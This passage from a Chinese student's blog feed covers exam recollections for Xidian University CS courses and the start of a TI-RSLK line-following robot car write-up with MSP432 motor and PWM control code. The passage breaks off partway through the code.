<p>2023年6月补档，的确没有进入决赛，这里给大家一个参考，第十四届初赛66分编号88应该是全省88名没有达到决赛线。</p> <p>资料库索引：</p> <blockquote> <p>sources/真题</p> </blockquote> <h2 id="权威公众号">权威公众号</h2> <p>这里不得不说一个非常权威的公众号：</p> <p><strong>考研竞赛数学</strong></p> <p>里面各种真题、模拟题、每日一题等等等等，内容丰富。</p> <h1 id="的笔记">🐹🐹的笔记</h1> <p>本🐹🐹在数学方面记的东西是少之又少，但是多少还是有点硬通货的，我将会把pdf版本的笔记放在本github库中，以便其他🐹🐹参考学习，请各位斧正。</p> <h1 id="联系">联系🐹🐹</h1> <p>📫邮箱： iamnotphage@gmail.com</p>]]></content><author><name></name></author><category term="竞赛"/><category term="math"/><summary type="html"><![CDATA[速通全国大学生数学竞赛(非数学专业)教程]]></summary></entry><entry><title type="html">西电CS核心课程指南</title><link href="https://iamnotphage.github.io/blog/2022/CSSurvivalGuide/" rel="alternate" type="text/html" title="西电CS核心课程指南"/><published>2022-12-31T15:59:00+00:00</published><updated>2022-12-31T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/CSSurvivalGuide</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/CSSurvivalGuide/"><![CDATA[<p><img src="https://img.shields.io/github/repo-size/Iamnotphage/CS-SurvivalGuide" alt=""/> <img src="https://img.shields.io/badge/license-CC0--1.0-blue" alt=""/> <img src="https://img.shields.io/github/stars/Iamnotphage/CS-SurvivalGuide?style=social" alt=""/></p> <p>西电CS学生自救指南，包含计组、计网、OS的学习指南。</p> <h1 id="前言">前言</h1> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>感觉高校的课程都是一坨...一言难尽。
</code></pre></div></div> <p>用着白垩纪的ppt和课本，津津有味地嚼着答辩。</p> <p>而且老师不用对你负责，老师不行就尽快自学吧，不然期末赛高考。</p> <p>下面每门课程都附有相应的Markdown文章，往下滑，点击即可。</p> <p>三种方法获取资料：(部分资料需要XMind软件查看思维导图)</p> <p>1.使用git直接clone本库</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Iamnotphage/CS-SurvivalGuide
</code></pre></div></div> <p>2.网页版下载本库</p> <p>3.国内阿里云盘地址(不想搞)</p> <h1 id="计算机组织和体系结构组成原理">计算机组织和体系结构/组成原理</h1> <p>学分最多的一集，千万要谨记这门课5.5学分。我的老师其实没啥大问题，就是经常补课，而且讲的比较慢。</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>内容是真他妈多。
</code></pre></div></div> <p>23年期中考，主要内容是前四章Cache之前的内容（西电教材），主要侧重原码、反码、补码、移码这些，然后是原码乘法、补码乘法，以及除法。 期中考的内容个人感觉不难。</p> <p>23年期末考最新资讯：选择15题（没啥奇怪的题）；大题第一题主存虚存以及Cache的相关计算，送分的;第二题有一个双总线结构的CPU的题，第一问考相容性和互斥性，第二问写微操作序列和微命令；第三问是一个水平型微指令写各个控制域字段的控制命令和位数；最后一题是关于流水线的，第一问就是正常的计算吞吐量和加速比，第二问是跳转的（其实我也不确定自己写的对不对，题目貌似没说是否断流，如果有分支预测啥的可能断流啥的）</p> <p>6月23日补档，昨天晚上出的成绩总评92，期中94、期末92，实验89，算是符合预期吧（（整学期没听过课我个人觉得已经很不错了 5/109）。</p> <h2 id="详情">详情</h2> <p><a href="/sources/ComputerArchitecture/Architecture.md">Click Here</a></p> <h1 id="计算机网络">计算机网络</h1> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>最逆天的一集。
</code></pre></div></div> <p>生平第一次见到老师翘课，曾经创下一节课讲十章的神话，期中没考试问我们期中考的怎么样，甚至可以学到让步状语从句。（甚至多次登错成绩）</p> <p>典型的上课耽误学习的例子。</p> <p>23年6月13补档，期末考只有部分不太确定。趁着记忆，选择题10题（有一题802.11无线局域网定义在哪两层）；大题第一题是香农定理、信噪比相关的计算；第二题是CRC余数的计算；第三题是画Manchester码；第四题第一问考了最小帧长、第二问考了802.3的MAC层帧结构和功能、第三问考了填空（合适位置填入网桥、集线器、交换机、路由器、中继器）；第五题Dijkstra算法生成路由表；第六题IP地址分配；第七题TCP连接建立、数据传输、连接取消的图以及拥塞控制；第八题邮件系统，发送邮件的过程，UA的作用，MTA的作用；收发邮件有哪些协议；</p> <p>6月23补档，期末考88，实验89.9（奇怪的数字）最后总评88（可以说这是从头到尾自学的一门课了，这样子知足了。最后排名3/71那只能说老师不够给力了）</p> <h2 id="详情-1">详情</h2> <p><a href="/sources/ComputerNetworking/Networking.md">Click Here</a></p> <h1 id="操作系统">操作系统</h1> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>这学期唯一正常的老师。
</code></pre></div></div> <p>这门课还好（就考核而言），有点就是八股文，缺点也是如此，这就导致难以深入理解操作系统。</p> <p>23年6月19补档，期末考刚结束，回忆一下跟往年不同的地方吧，首先选择题有一个FAT簇的分配问题，其他选择没啥特别的；大题的话，第一题是磁盘调度，考了个SCAN算法的，第二题死锁的资源图化简，第三题多级队列循环调度（这个点往年没考过），第四题银行家算法，第五题虚存相关内容、然后是缺页的置换算法LRU FIFO啥的，第六题是UNIX的文件打开的那题（稍微不同的是要求画出磁盘索引区），第七题多道程序的作业调度，计算平均周转时间和周转系数，细心即可。</p> <h2 id="详情-2">详情</h2> <p><a href="/sources/OperatingSystem/OS.md">Click Here</a></p>]]></content><author><name></name></author><category term="西电相关"/><category term="cs"/><summary type="html"><![CDATA[西电CS生存指南(计组)]]></summary></entry><entry><title type="html">TI-RSLK自动循迹小车</title><link href="https://iamnotphage.github.io/blog/2022/TI-RSLK%E8%87%AA%E5%8A%A8%E5%BE%AA%E8%BF%B9%E5%B0%8F%E8%BD%A6/" rel="alternate" type="text/html" title="TI-RSLK自动循迹小车"/><published>2022-10-06T15:59:00+00:00</published><updated>2022-10-06T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/TI-RSLK%E8%87%AA%E5%8A%A8%E5%BE%AA%E8%BF%B9%E5%B0%8F%E8%BD%A6</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/TI-RSLK%E8%87%AA%E5%8A%A8%E5%BE%AA%E8%BF%B9%E5%B0%8F%E8%BD%A6/"><![CDATA[<h1 id="前言">前言</h1> <p>暑假双创周花了几天做的，没啥含金量，纯记录、分享、追悼。 主板用的是德州仪器的MSP432P401R，需要下载CCS和相关的SDK软件开发包。</p> <h1 id="展示">展示</h1> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-10-06/complete-480.webp 480w,/assets/img/2022-10-06/complete-800.webp 800w,/assets/img/2022-10-06/complete-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-10-06/complete.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-10-06/complete2-480.webp 480w,/assets/img/2022-10-06/complete2-800.webp 800w,/assets/img/2022-10-06/complete2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-10-06/complete2.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h1 id="一总体功能描述">一、总体功能描述</h1> <h2 id="11-驱动">1.1 驱动</h2> <p>利用底层驱动函数，控制电机的引脚高低电平变化，从而控制电机的启动、停止，并利用底层驱动函数的不同组合组成封装函数，让小车实现前进、后退、左转弯以及右转弯等驱动功能。</p> <h2 id="12-碰撞">1.2 碰撞</h2> <p>首先利用驱动函数使小车能够运行，在碰撞模块中，通过碰撞传感器检测碰撞状态，改变车轮状态，利用GPIO库函数实现车轮转动，从而实现左右转弯、直行后退。</p> <h2 id="13-变速">1.3 变速</h2> <p>利用PWM波驱动控制电机启停的引脚，改变PWM波占空比的大小，首先人工设定周期，对电机状态利用GPIO库函数设定High和Low状态实现类似PWM的调速模式。</p> <h2 id="14-循迹行进">1.4 循迹行进</h2> <p>在循迹行进模块中，利用车底部的光传感器，首先让P5.3发射红外线，其余接收信号，P7.0至7.7检测到有黑线部分后，利用返回值判定多种基本线路，从而实现对不同线路状态的判断，进一步控制电机状态，实现左右大转弯，左右小转弯、前进小转弯、后退、刹车等功能。</p> <h1 id="二模块功能设计">二、模块功能设计</h1> <h2 id="21-ti-rlsk驱动基本功能设计">2.1 TI-RLSK驱动基本功能设计</h2> <h3 id="1驱动基本功能设计图">（1）驱动基本功能设计图</h3> <p><a href="https://blog.csdn.net/Phage17/article/details/127348231?spm=1001.2014.3001.5501">图片失效，前往这里</a></p> <h3 id="2驱动基本功能设计思路">（2）驱动基本功能设计思路</h3> <p>根据电机驱动模块的引脚与真值表，由<strong>P1.6/P1.7</strong>控制电机转向，<strong>P2.7/P2.6</strong>控制电机的启动，利用直接赋予高低电平的语句实现功能</p> <p><a href="https://blog.csdn.net/Phage17/article/details/127348231?spm=1001.2014.3001.5501">图片失效，前往这里</a></p> <p>据此思路实现了驱动的所有情况的功能，并将以上所有底层和封装函数，做成.h文件放在工程中便于主函数调用。</p> <h2 id="22-ti-rlsk行走碰撞功能设计">2.2 TI-RLSK行走碰撞功能设计</h2> <h3 id="1碰撞功能设计流程图">（1）碰撞功能设计流程图</h3> <p><a href="https://blog.csdn.net/Phage17/article/details/127348231?spm=1001.2014.3001.5501">图片失效，前往这里</a></p> <h3 id="2碰撞功能设计思路">（2）碰撞功能设计思路</h3> <p><a href="https://blog.csdn.net/Phage17/article/details/127348231?spm=1001.2014.3001.5501">图片失效，前往这里</a></p> <h1 id="三程序实现">三、程序实现</h1> <p>用的是Code Composer Studio，类C的语言。</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;ti/devices/msp432p4xx/driverlib/driverlib.h&gt;</span><span class="cp">
</span><span class="cm">/* Standard Includes */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cm">/* Application Defines */</span>
<span class="cp">#define TIMER_PERIOD 127
#define DUTY_CYCLE1 67
#define DUTY_CYCLE2 70
</span>
<span class="kt">uint8_t</span> <span class="nf">LineSensor_Read</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">time</span><span class="p">);</span>
<span class="kt">void</span> <span class="nf">Delay_Nx1us</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">time</span><span class="p">);</span>

<span class="k">static</span> <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">val</span><span class="p">;</span>
<span class="k">volatile</span> <span class="kt">uint16_t</span> <span class="n">speed_left</span><span class="o">=</span><span class="mi">50</span><span class="p">,</span><span class="n">speed_right</span><span class="o">=</span><span class="mi">50</span><span class="p">;</span>
<span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">flag</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">ui32_delay</span><span class="p">;</span>

<span class="cm">/* Timer_A UpDown Configuration Parameter */</span>
<span class="k">const</span> <span class="n">Timer_A_UpDownModeConfig</span> <span class="n">upDownConfig</span> <span class="o">=</span><span class="p">{</span>
 <span class="n">TIMER_A_CLOCKSOURCE_SMCLK</span><span class="p">,</span>              <span class="c1">// SMCLK Clock SOurce</span>
 <span class="n">TIMER_A_CLOCKSOURCE_DIVIDER_1</span><span class="p">,</span>          <span class="c1">// SMCLK/1 = 3MHz</span>
 <span class="n">TIMER_PERIOD</span><span class="p">,</span>                           <span class="c1">// 127 tick period</span>
 <span class="n">TIMER_A_TAIE_INTERRUPT_DISABLE</span><span class="p">,</span>         <span class="c1">// Disable Timer interrupt</span>
 <span class="n">TIMER_A_CCIE_CCR0_INTERRUPT_DISABLE</span><span class="p">,</span>    <span class="c1">// Disable CCR0 interrupt</span>
 <span class="n">TIMER_A_DO_CLEAR</span>                        <span class="c1">// Clear value</span>
<span class="p">};</span>

<span class="cm">/* Timer_A Compare Configuration Parameter  (PWM1) */</span>
<span class="n">Timer_A_CompareModeConfig</span> <span class="n">compareConfig_PWM_L</span> <span class="o">=</span><span class="p">{</span>
 <span class="n">TIMER_A_CAPTURECOMPARE_REGISTER_4</span><span class="p">,</span>          <span class="c1">// Use CCR4</span>
 <span class="n">TIMER_A_CAPTURECOMPARE_INTERRUPT_DISABLE</span><span class="p">,</span>   <span class="c1">// Disable CCR interrupt</span>
 <span class="n">TIMER_A_OUTPUTMODE_TOGGLE_SET</span><span class="p">,</span>              <span class="c1">// Toggle output but</span>
 <span class="n">DUTY_CYCLE1</span>                                 <span class="c1">// 32 Duty Cycle</span>
<span class="p">};</span>

<span class="cm">/* Timer_A Compare Configuration Parameter (PWM2) */</span>
<span class="n">Timer_A_CompareModeConfig</span> <span class="n">compareConfig_PWM_R</span> <span class="o">=</span><span class="p">{</span>
 <span class="n">TIMER_A_CAPTURECOMPARE_REGISTER_3</span><span class="p">,</span>          <span class="c1">// Use CCR3</span>
 <span class="n">TIMER_A_CAPTURECOMPARE_INTERRUPT_DISABLE</span><span class="p">,</span>   <span class="c1">// Disable CCR interrupt</span>
 <span class="n">TIMER_A_OUTPUTMODE_TOGGLE_SET</span><span class="p">,</span>              <span class="c1">// Toggle output but</span>
 <span class="n">DUTY_CYCLE2</span>                                 <span class="c1">// 96 Duty Cycle</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">motor_gpio_init</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="kt">void</span> <span class="nf">robot_init_status</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="c1">//初始化端口配置</span>
<span class="kt">void</span> <span class="nf">motor_gpio_init</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">TurnLeft</span><span class="p">(){</span>   <span class="c1">//左转模式</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span> <span class="c1">//左轮向后</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>  <span class="c1">//右轮向前</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">TurnLeftDegree</span><span class="p">(</span><span class="kt">int</span> <span class="n">value</span><span class="p">){</span><span class="c1">//传入左转角度</span>
    <span class="n">value</span><span class="o">*=</span><span class="mi">37</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">value</span><span class="o">--</span><span class="p">){</span>
        <span class="n">TurnLeft</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">TurnRight</span><span class="p">(){</span>   <span class="c1">//右转模式</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>  <span class="c1">//左轮向前</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span> <span class="c1">//右轮向后</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">TurnRightDegree</span><span class="p">(</span><span class="kt">int</span> <span class="n">value</span><span class="p">){</span><span class="c1">//传入右转角度</span>
    <span class="n">value</span><span class="o">*=</span><span class="mi">37</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">value</span><span class="o">--</span><span class="p">){</span>
        <span class="n">TurnRight</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">Forward</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//车辆直行</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">Back</span> <span class="p">(</span><span class="kt">int</span> <span class="n">time</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//输入后退时间控制距离   //车辆后退或刹车</span>
    <span class="k">while</span><span class="p">(</span><span class="n">time</span><span class="o">--</span><span class="p">){</span>
       <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
       <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
       <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
       <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
       <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
       <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Stop</span><span class="p">(){</span>  <span class="c1">//关闭动作</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>

    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>

<span class="p">}</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">ui32Loop</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">delay</span><span class="p">(</span><span class="kt">int</span> <span class="n">period</span><span class="p">){</span> <span class="c1">// 输入延时值</span>
    <span class="k">for</span><span class="p">(</span><span class="n">ui32Loop</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ui32Loop</span> <span class="o">&lt;</span> <span class="n">period</span><span class="p">;</span> <span class="n">ui32Loop</span><span class="o">++</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">//电机相关引脚的初始化。</span>
<span class="kt">void</span> <span class="nf">robot_init_status</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">GPIO_setOutputLowOnPin</span> <span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span> <span class="p">(</span><span class="n">GPIO_PORT_P3</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span> <span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span> <span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span> <span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN7</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span> <span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN6</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">debug_time</span><span class="p">;</span>
    <span class="c1">//停用看门狗</span>
    <span class="n">MAP_WDT_A_holdTimer</span><span class="p">();</span>
    <span class="c1">//使能浮点运算的单元FPU,提高计算效率</span>
    <span class="n">MAP_FPU_enableModule</span><span class="p">();</span>
    <span class="n">MAP_CS_setDCOFrequency</span><span class="p">(</span><span class="mi">24000000</span><span class="p">);</span>
    <span class="n">MAP_CS_setReferenceOscillatorFrequency</span><span class="p">(</span><span class="n">CS_REFO_32KHZ</span><span class="p">);</span>
    <span class="n">MAP_CS_initClockSignal</span><span class="p">(</span><span class="n">CS_ACLK</span><span class="p">,</span> <span class="n">CS_REFOCLK_SELECT</span><span class="p">,</span> <span class="n">CS_CLOCK_DIVIDER_1</span><span class="p">);</span>
    <span class="n">MAP_CS_initClockSignal</span><span class="p">(</span><span class="n">CS_MCLK</span><span class="p">,</span> <span class="n">CS_DCOCLK_SELECT</span><span class="p">,</span> <span class="n">CS_CLOCK_DIVIDER_1</span><span class="p">);</span>
    <span class="n">MAP_CS_initClockSignal</span><span class="p">(</span><span class="n">CS_HSMCLK</span><span class="p">,</span> <span class="n">CS_DCOCLK_SELECT</span><span class="p">,</span> <span class="n">CS_CLOCK_DIVIDER_2</span><span class="p">);</span>
    <span class="n">MAP_CS_initClockSignal</span><span class="p">(</span><span class="n">CS_SMCLK</span><span class="p">,</span> <span class="n">CS_DCOCLK_SELECT</span><span class="p">,</span> <span class="n">CS_CLOCK_DIVIDER_8</span><span class="p">);</span>
    <span class="c1">//以上是系统时钟初始化</span>
    <span class="c1">//GPIO端口初始化</span>
    <span class="n">motor_gpio_init</span><span class="p">();</span>
    <span class="n">robot_init_status</span><span class="p">();</span>

    <span class="cm">/*p1.0设为输出，LED用来指示程序正常运行*/</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P1</span><span class="p">,</span> <span class="n">GPIO_PIN0</span><span class="p">);</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span> <span class="n">GPIO_PIN0</span><span class="o">+</span><span class="n">GPIO_PIN1</span><span class="o">+</span><span class="n">GPIO_PIN2</span><span class="p">);</span>

    <span class="c1">//p5.3接发射led,设置为输出.　输出低电平(默认关闭)</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P5</span><span class="p">,</span> <span class="n">GPIO_PIN3</span><span class="p">);</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P5</span><span class="p">,</span><span class="n">GPIO_PIN3</span><span class="p">);</span>

    <span class="c1">//p7.0-p7.7全都设置为输入</span>
    <span class="n">GPIO_setAsInputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P7</span><span class="p">,</span> <span class="n">PIN_ALL8</span><span class="p">);</span>

    <span class="c1">//设置P2.6 / P2.7 引脚为输出，且选择功能引脚(PWM输出)</span>
    <span class="n">MAP_GPIO_setAsPeripheralModuleFunctionOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P2</span><span class="p">,</span>
                                                    <span class="n">GPIO_PIN6</span> <span class="o">+</span> <span class="n">GPIO_PIN7</span><span class="p">,</span> <span class="n">GPIO_PRIMARY_MODULE_FUNCTION</span><span class="p">);</span>
    <span class="c1">//Timer_A1工作在增减计数模式,开始计数</span>
    <span class="n">MAP_Timer_A_configureUpDownMode</span><span class="p">(</span><span class="n">TIMER_A0_BASE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">upDownConfig</span><span class="p">);</span>
    <span class="n">MAP_Timer_A_startCounter</span><span class="p">(</span><span class="n">TIMER_A0_BASE</span><span class="p">,</span> <span class="n">TIMER_A_UPDOWN_MODE</span><span class="p">);</span>

    <span class="c1">//初始化比较寄存器产生PWM1</span>
    <span class="n">MAP_Timer_A_initCompare</span><span class="p">(</span><span class="n">TIMER_A0_BASE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">compareConfig_PWM_L</span><span class="p">);</span>

    <span class="c1">//初始化比较寄存器产生PWM2</span>
    <span class="n">MAP_Timer_A_initCompare</span><span class="p">(</span><span class="n">TIMER_A0_BASE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">compareConfig_PWM_R</span><span class="p">);</span>
    <span class="n">MAP_SysCtl_enableSRAMBankRetention</span><span class="p">(</span><span class="n">SYSCTL_SRAM_BANK1</span><span class="p">);</span>
    <span class="n">MAP_Interrupt_enableMaster</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"line sensor test start!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">Delay_Nx1us</span><span class="p">(</span><span class="mi">2000000</span><span class="p">);</span>
    <span class="n">debug_time</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span><span class="c1">//判断小车的状态是什么样的</span>
        <span class="n">Delay_Nx1us</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">//延时0.00048s</span>
        <span class="n">val</span><span class="o">=</span><span class="n">LineSensor_Read</span><span class="p">(</span><span class="n">debug_time</span><span class="p">);</span>

        <span class="c1">//大右转</span>
        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0x07</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0x0f</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0x1f</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0x3f</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0x7f</span><span class="p">){</span>
            <span class="n">TurnRightDegree</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">//大左转</span>
